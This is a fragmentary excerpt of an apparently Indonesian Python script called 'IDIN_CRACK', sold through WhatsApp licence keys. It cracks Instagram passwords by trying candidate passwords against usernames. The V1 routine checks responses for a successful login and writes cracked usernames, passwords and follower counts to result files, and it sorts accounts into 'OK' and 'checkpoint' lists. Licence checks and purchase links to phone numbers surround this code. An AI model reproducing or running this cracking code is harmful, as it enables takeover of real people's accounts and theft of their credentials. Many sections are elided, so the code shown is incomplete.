...
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
idin = random.choice([P,M,H,K,U,O,N])
CY='\033[96;1m'
#H='\033[96;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
...
def banner():
	clear()
	au=f"""
  \t  {WR}          ________  _____   __     __________
  \t  {WR}         /  _/ __ \/  _/ | / /    /  _/ ____/
  \t  {WR}         / // / / // //  |/ /     / // / __  
  \t  {WR}       _/ // /_/ // // /|  /    _/ // /_/ /  
  \t  {WR}      /___/_____/___/_/ |_/____/___/\____/   
  \t  {WR}                         /_____/             """
    ...
    if "sukses" in lisensiku:
        try:
            ...
            try:
                ...
                loadinglogin()
                prints(Panel(f"        selamat [green]{nama}[/] Cookismu Di Terima", padding=(0,5), style=f"{color_table}", width=80));time.sleep(2);time.sleep(2);exit(f"[{M}!{N}] Jalankan ulang perintah nya")
...
[{H}•{N}]Username       : {H}{self.username}{N}
[{H}•{N}]Followers      : {H}{followers}{N}
[{H}•{N}]Following      : {H}{following}{N}
[{H}•{N}]AUTHOR       :{H}IDIN'''
			print(welcome)
			tap = me()
	...
	def ingfo(self):
		prints(Panel(f"\t  [white][[green]ON[white]/[red]OFF[white]] 200 USERNAME AGAGR TIDAK TERDETEKSI [blue]SPAM IP[/]",width=80,padding=(0,3),style=f"{color_table}"))
		prints(Panel(f'''    {H2}result/[green]success-{day}.txt[/]{P2}<=>{K2}result/[yellow]{K2}checkpoint-{day}.txt[/]''',title=f"[[white] Cek Hasil [/]]",width=80,style=f"{color_table}"))
...
# {SE}╰─────────────────────────────────╯{SE} ╰───────────────────────────────────╯''',title=f"[[white] Cek Hasil [/]]",width=80,style=f"{color_table}"))
	def ifo(self):
		#print(f'{P}[{M}01{P}]{H}METODE V1 {H}GACOR\n{P}[{M}02{P}]{H}METODE V2 {P}COBAIN')
		urut = []
		urut.append(Panel(f' [white][[blue]01[white]]. METHOD V1[white] [[green] GACOR [white]]\n [white][[blue]02[white]]. METHOD V2[white] [[green] COBAIN [white]]',width=40,title=f"[white] METODE MENYALA ",style=f"{color_table}"))
	...
	def passwordAPI(self,xnx):
		...
		if u in ["1","01"]:
			...
			method.append('satu')
		#prints(Panel(f"{P2}[{B2}01{P2}][H2] V1\n{P2}[{B2}02{P2}][H2] V2\n{P2}[{B2}03{P2}][H2] V3\n{P2}[{B2}04{P2}][M2] MANUAL PASSWORD ",title=f"[{P2} PILIHAN PASSWORD[/] ]",width=80,padding=(0,4),style=f"{color_table}"))
		prints(Panel(f"[white][[blue]01[white]]. V1\n[white][[blue]02[white]]. V2\n[white][[blue]03[white]]. V3\n[white][[blue]04[white]]. [red]MANUAL ",title=f"[{P2} PILIHAN PASSWORD[/] ]",width=80,padding=(0,4),style=f"{color_table}"))
		#print(f'{P}[{M}01{P}]{H}V1\n{P}[{M}02{P}]{H}V2\n{P}[{M}03{P}]{H}V3\n{P}[{M}04{P}]{M}MANUAL')
	...
	def V1(self,user,pas):
		...
		idin = random.choice([M2, H2, P2, U2, O2,])
		prog.update(des,description=f"[white][[green] IDIN_CRACK [white]] [white][{idin}{str(loop)}[white]/{len(internal)}[white]] [white][[green]OK•[bold green]{len(success)}[white]<=>[yellow]CP•[bold yellow]{len(checkpoint)}[white]]")
		prog.advance(des)
		for pw in pas:
				try:
				...
				try:
					...
					if "logged_in_user" in str(ncek):
						...
						try:
							...
							#tree.add(f"{P2}FOLLOWERS : {H2}{pengikut}").add(f"{H2}{mengikut}")
							#tree.add(f"{P2}NOMOR HP  : {H2}{nomor}").add(f"{H2}{email}")
							#tree.add(f"{P2}POSTINGAN : {H2}{postingan}").add(f"{H2}{cookie}")
							#prints(tree)
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
						...
						#tree.add(f"{P2}FOLLOWERS : {K2}{pengikut}").add(f"{K2}{mengikut}")
...
def tlisensi():
    ...
    if lisen in ['']:
     ...
     tlisensi()
    if lisen in ['buy','Buy']:
     os.system('xdg-open https://wa.me/6282277572964?text=Bang+beli+lisensi+IG+nya+dong');exit()
    loadinglisen()
...
def register_device():
	while True:
		...
		if os.path.exists("/data/data/com.termux/files/usr/etc/.license"):
			...
			httpCaht = requests.get('https://github.com/MikuuXD/PREM/blob/main/approval.txt').text
			if key in httpCaht:
				clear()
				banner()
				lisensiku.append("sukses")
				...
				cetak(nel(po, style= ''))
				cetak(nel(f"[•] {M2}Key anda belum di konfirmasi{hapus}\n[•] {M2}Silahkan Beli Ke Wa {hapus}{H2}+6282177571964{hapus}{M2} untuk menggunakan sc{hapus}"))
				...
				os.system(f'xdg-open http://wa.me/+6282277571964?text=Bang+beli+key+sc+instagram+{key}')
